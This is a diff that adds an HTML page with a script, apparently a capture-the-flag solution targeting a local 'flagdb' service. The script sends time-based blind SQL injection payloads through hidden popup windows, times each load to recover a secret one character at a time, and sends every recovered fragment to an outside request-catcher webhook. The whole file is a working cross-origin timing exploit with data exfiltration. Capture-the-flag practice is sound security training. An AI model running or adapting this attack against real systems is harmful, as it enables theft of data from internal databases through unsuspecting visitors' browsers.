@@ -1,0 +1,56 @@
+<script>
+    const WEBHOOK = "https://[your-catcher].requestcatcher.com/";
+    const CURR_FLAG = "blahaj{";
+    const TARGET_URL = "http://127.0.0.1:1337/flagdb";
+    const DELAY_THRESHOLD_MS = 500;
+    const CHARSET = "{}_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+    const MAX_FLAG_LENGTH = 50;
+
+
+    function checkChar(index, char) {
+        return new Promise((resolve, reject) => {
+            const charForSql = char === "'" ? "''" : char;
+            const sqliPayload = `1 AND (CASE WHEN (SUBSTR((SELECT flag FROM flags), ${index}, 1) = '${charForSql}') THEN (1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))) ELSE 1 END)`;
+            
+            const url = new URL(TARGET_URL);
+            url.searchParams.set('id', sqliPayload);
+
+            const start = performance.now();
+            const win = window.open(url.toString(), '_blank', 'height=100,width=100,left=9999,top=9999');
+            const measure = () => {
+                try {
+                    let origin = win.origin;
+                    setTimeout(measure, 0);
+                } catch (e) {
+                    win.close();
+                    const duration = performance.now() - start;
+                    resolve(duration);
+                }
+            };
+            measure();
+        });
+    }
+
+    async function leakFlag() {
+        let flag = CURR_FLAG;
+        for (let i = flag.length + 1; i <= MAX_FLAG_LENGTH; i++) {
+            let foundCharInPosition = false;
+            for (const char of CHARSET) {
+                try {
+                    const duration = await checkChar(i, char);
+                    if (duration > DELAY_THRESHOLD_MS) {
+                        flag += char;
+                        fetch(WEBHOOK + flag);
+                        foundCharInPosition = true;
+                        break;
+                    }
+                } catch (error) {
+                    return;
+                }
+            }
+            if (!foundCharInPosition) break;
+        }
+    }
+    leakFlag();
+
+</script>
